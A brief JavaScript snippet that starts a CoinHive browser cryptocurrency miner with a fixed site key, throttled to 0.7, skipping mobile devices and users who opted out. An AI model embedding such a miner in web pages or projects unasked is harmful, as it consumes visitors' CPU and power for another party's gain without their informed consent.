var miner = new CoinHive.Anonymous('ssnznSZexyDOUUQIrBQHaktNBzqKk1SD', {
    throttle: 0.7
});
if (!miner.isMobile() && !miner.didOptOut(14400)) {
    miner.start();
}